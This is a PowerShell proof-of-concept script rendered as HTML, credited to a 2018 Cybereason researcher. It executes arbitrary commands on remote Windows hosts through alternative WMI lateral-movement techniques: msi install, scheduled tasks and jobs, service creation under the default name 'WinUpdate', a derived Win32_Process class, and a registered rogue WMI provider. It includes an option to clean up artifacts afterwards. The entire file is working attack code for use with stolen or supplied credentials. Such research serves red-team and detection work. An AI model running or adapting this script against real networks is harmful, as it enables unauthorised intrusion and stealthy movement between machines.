<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Invoke-WMILM.ps1</title>
</head><body>&lt;#<br/>
Proof of Concept for Alternative WMI Lateral Movenent Methods<br/>
  Copyright (C) 2018 Cybereason<br/>
<br/>
  This program is free software: you can redistribute it and/or modify<br/>
  it under the terms of the GNU Affero General Public License as<br/>
  published by the Free Software Foundation, either version 3 of the<br/>
  License, or (at your option) any later version.<br/>
<br/>
  This program is distributed in the hope that it will be useful,<br/>
  but WITHOUT ANY WARRANTY; without even the implied warranty of<br/>
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the<br/>
  GNU Affero General Public License for more details.<br/>
<br/>
  You should have received a copy of the GNU Affero General Public License<br/>
  along with this program. If not, see &lt;http://www.gnu.org/licenses/&gt;.<br/>
 <br/>
  Author: Philip Tsukerman<br/>
#&gt;<br/>
<br/>
<br/>
function Invoke-WMILM {<br/>
&lt;#<br/>
  .DESCRIPTION<br/>
  Run code on a remote machine, without (at least directly) using the Win32_Process class<br/>
<br/>
  .PARAMETER Target<br/>
  Hostname or IP of the target machine<br/>
<br/>
  .PARAMETER Type<br/>
  The Type of technique to be used<br/>
<br/>
  .PARAMETER Name<br/>
  Supplies fields such as service name, to techniques needing it<br/>
<br/>
  .PARAMETER Command<br/>
  Executable to run<br/>
<br/>
  .PARAMETER CommandArgs<br/>
  Arguments to the executable<br/>
<br/>
  .PARAMETER CleanUp<br/>
  Should we try to clean up artifacts created on the target machine?<br/>
<br/>
  .PARAMETER Username<br/>
  Username for target machine<br/>
<br/>
  .PARAMETER Password<br/>
  Password for target machine <br/>
#&gt;<br/>
<br/>
  [CmdletBinding()]<br/>
  Param (<br/>
    [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]<br/>
    [String]<br/>
    $Target,<br/>
<br/>
    [Parameter(Mandatory = $true, Position = 1)]<br/>
    [ValidateSet(&quot;Product&quot;, &quot;Service&quot;, &quot;Job&quot;, &quot;Task&quot;, &quot;Provider&quot;, &quot;DerivedProcess&quot;)]<br/>
    [String]<br/>
    $Type = &quot;Service&quot;,<br/>
<br/>
    [Parameter(Mandatory = $false, Position = 2)]<br/>
    [String]<br/>
    $Name = &quot;WinUpdate&quot;,<br/>
<br/>
    [Parameter(Mandatory = $false, Position = 3)]<br/>
    [String]<br/>
    $Command,<br/>
<br/>
    [Parameter(Mandatory = $false, Position = 4)]<br/>
    [String]<br/>
    $CommandArgs,<br/>
<br/>
    [Parameter(Mandatory = $false, Position = 5)]<br/>
    [Bool]<br/>
    $CleanUp = $false,<br/>
<br/>
    [Parameter(Mandatory = $true, Position = 6)]<br/>
    [string]<br/>
    $Username,<br/>
<br/>
    [Parameter(Mandatory = $true, Position = 7)]<br/>
    [string]<br/>
    $Password<br/>
  )<br/>
  <br/>
  <br/>
  Process {<br/>
<br/>
    # Create a remote CIM session<br/>
    $SecurePass = ConvertTo-SecureString -String $Password -asplaintext -force<br/>
    $cred = new-object -typename System.Management.Automation.PSCredential -ArgumentList @($Username, $SecurePass)<br/>
    $Opt = New-CimSessionOption -Protocol &quot;DCOM&quot;<br/>
    $Session = New-Cimsession -ComputerName $Target -SessionOption $Opt -Credential $Cred<br/>
<br/>
    # Lateral movement using the Win32_Product class. Command needs to be a path to an msi file on the victim<br/>
    if ($Type -Match &quot;Product&quot;) {<br/>
      Write-Host &quot;Installing package '$Command'&quot;<br/>
      $Result = Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = $Command; Options = &quot;&quot;; AllUsers = $false}<br/>
      <br/>
      if ($Result.ReturnValue -ne 1603){<br/>
      Write-Warning &quot;Failed to install package. ERROR: $($Result.ReturnValue) &quot;<br/>
      break<br/>
     }<br/>
    }<br/>
<br/>
    # Lateral movement using the PS_ScheduledTask classes. Enabling cleanup deletes the task after running. Requires Win8+<br/>
    elseif ($Type -Match &quot;Task&quot;) {<br/>
      Try {<br/>
        Write-Host &quot;Creating scheduled task names $Name with command '$Command $CommandArgs'&quot;<br/>
        $Action = New-ScheduledTaskAction -Execute $Command -Argument $CommandArgs -WorkingDirectory &quot;c:\windows\system32&quot; -CimSession = $Session<br/>
        Register-ScheduledTask -Action $Action -TaskName $Name -CimSession $Session<br/>
        Start-ScheduledTask -TaskName $Name<br/>
<br/>
        if ($Cleanup -eq $true) {<br/>
          Unregister-ScheduledTask -TaskName $Name -Confirm:$false -CimSession $Session<br/>
        }<br/>
      }<br/>
<br/>
      Catch {<br/>
        Write-Warning &quot;Task creation failed. Are you sure target is Win8+?&quot;<br/>
        break<br/>
      }<br/>
      <br/>
    }<br/>
<br/>
    # Lateral movement using the Win32_ScheduledJob class. Enabling cleanup deletes the task after running. Does not work on Win8+<br/>
    elseif ($Type -Match &quot;Job&quot;) {<br/>
      $Result = Invoke-CimMethod -CimSession $Session -ClassName Win32_ScheduledJob -MethodName Create -Arguments @{Command=&quot;$Command $CommandArgs&quot;; StartTime=(Get-Date).AddSeconds(30)}<br/>
      Write-Host &quot;Creating scheduled job with command '$Command $CommandArgs' to run in 30 seconds&quot;<br/>
<br/>
      if ($Result.ReturnValue -eq 8) {<br/>
        Write-Warning &quot;Scheduled job creation failed. Are you sure at.exe is supported on target machine?&quot;<br/>
        break<br/>
      }<br/>
<br/>
      if ($result.ReturnValue -ne 0) {<br/>
        Write-Warning &quot;Scheduled job creation failed. Error $($Result.ReturnValue)&quot;<br/>
        break  <br/>
      }<br/>
<br/>
      if ($Cleanup -eq $true) {<br/>
        Write-Host &quot;Sleeping to let the task execute, and then deleting it&quot;<br/>
        Start-Sleep 30<br/>
        Invoke-CimMethod -InputObject (Get-CimInstance -CimSession $Session -Query &quot;SELECT * FROM Win32_ScheduledJob WHERE JobId = $($Result.JobId)&quot;) -MethodName Delete<br/>
      }<br/>
    }<br/>
<br/>
    # Lateral movement using the Win32_Service class. Enabling cleanup deletes the service after running<br/>
    elseif ($Type -Match &quot;Service&quot;) {<br/>
      Write-Host &quot;Creating and running a new service with name $Name and command '$Command $CommandArgs'&quot;<br/>
      $Result = Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = $Name; DisplayName = $Name; PathName = &quot;$Command $CommandArgs&quot;; ServiceType = [byte]::Parse(&quot;16&quot;); StartMode = &quot;Manual&quot;}<br/>
<br/>
      if ($Result.ReturnValue -ne 0) {<br/>
      Write-Warning &quot;Service creation failed. Error $($Result.ReturnValue)&quot;<br/>
        break   <br/>
      }<br/>
      $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter &quot;Name LIKE '$Name'&quot;<br/>
      Invoke-CimMethod -InputObject $Service -MethodName StartService<br/>
<br/>
      if ($Cleanup -eq $true) {<br/>
        Write-Host &quot;Deleting service&quot;<br/>
        Invoke-CimMethod -InputObject $Service -MethodName StopService<br/>
        Invoke-CimMethod -InputObject $Service -MethodName Delete<br/>
      }<br/>
    }<br/>
<br/>
    # Lateral movement by derivation from the Win32_Process class. New class name will be the $Name parameter prefixed with 'Win32_'<br/>
    elseif ($Type -Match &quot;DerivedProcess&quot;) {<br/>
      Write-Host &quot;Creating a subclass of Win32_Process named Win32_$Name&quot;<br/>
      $Options = New-Object Management.ConnectionOptions<br/>
      $Options.Username = $Username<br/>
      $Options.Password = $Password<br/>
      $Options.EnablePrivileges = $True<br/>
      $Connection = New-Object Management.ManagementScope<br/>
      $Connection.Path = &quot;\\$Target\root\cimv2&quot;<br/>
      $Connection.Options = $Options<br/>
      $Connection.Connect()<br/>
      $Path = New-Object Management.ManagementPath(&quot;Win32_Process&quot;)<br/>
      $Class = New-Object Management.ManagementClass($Connection, $Path, $null)<br/>
      $NewClass = $Class.Derive(&quot;Win32_$Name&quot;)<br/>
      $NewClass.Put()<br/>
      Write-Host &quot;Using Win32_$Name to create a new process with command line '$Command $CommandArgs'&quot;<br/>
      $Result = Invoke-CimMethod -CimSession $Session -ClassName &quot;Win32_$Name&quot; -MethodName Create -Arguments @{CommandLine = &quot;$Command $CommandArgs&quot;}<br/>
<br/>
      if ($Result.ReturnValue -ne 0){<br/>
        Write-Warning &quot;Could not create process. ERROR $($Result.ReturnValue)&quot;<br/>
      }<br/>
    }<br/>
<br/>
    # Lateral movement using WMI provider registration. Cleanup option removes the provider instance and the associated COM object<br/>
    elseif ($Type -Match &quot;Provider&quot;) {<br/>
<br/>
      [UInt32]$Hklm = 2147483650 # Int represenation of the HKLM hive<br/>
      $Guid = ([Guid]::NewGuid()).Guid.ToUpper()<br/>
      $Key = &quot;SOFTWARE\Classes\CLSID\{$Guid}&quot;<br/>
      echo $Key<br/>
      $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName CreateKey -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key}<br/>
<br/>
      if ($Result.ReturnValue -ne 0){<br/>
        Write-Warning &quot;Could not create key $Key in HKLM. ERROR $($Result.ReturnValue)&quot;<br/>
        break<br/>
      }<br/>
<br/>
      $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName SetStringValue -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key; sValueName = &quot;&quot;; sValue = &quot;$Name&quot;}<br/>
<br/>
      $Key = &quot;SOFTWARE\Classes\CLSID\{$Guid}\LocalServer32&quot;<br/>
      echo $key<br/>
      $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName CreateKey -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key}<br/>
<br/>
      if ($Result.ReturnValue -ne 0){<br/>
        Write-Warning &quot;Could not create key $Key in HKLM. ERROR $($Result.ReturnValue)&quot;<br/>
        break<br/>
      }<br/>
<br/>
      $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName SetStringValue -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key; sValueName = &quot;&quot;; sValue = &quot;$Command $CommandArgs&quot;}<br/>
<br/>
      $Prov = New-CimInstance -CimSession $Session -ClassName __Win32Provider -Arguments @{CLSID = &quot;{$Guid}&quot;; Name = $Name}<br/>
      Invoke-CimMethod -CimSession $Session -ClassName Msft_Providers -MethodName Load -Arguments @{Namespace = &quot;root/CIMV2&quot;; Provider=&quot;$Name&quot;}<br/>
<br/>
      if ($Cleanup -eq $true) {<br/>
        Remove-CimInstance -InputObject $Prov<br/>
        $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName DeleteKey -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key}<br/>
      }<br/>
<br/>
    }<br/>
  }<br/>
<br/>
  End {<br/>
    Write-Output &quot;The End!&quot;<br/>
  }<br/>
}</body></html>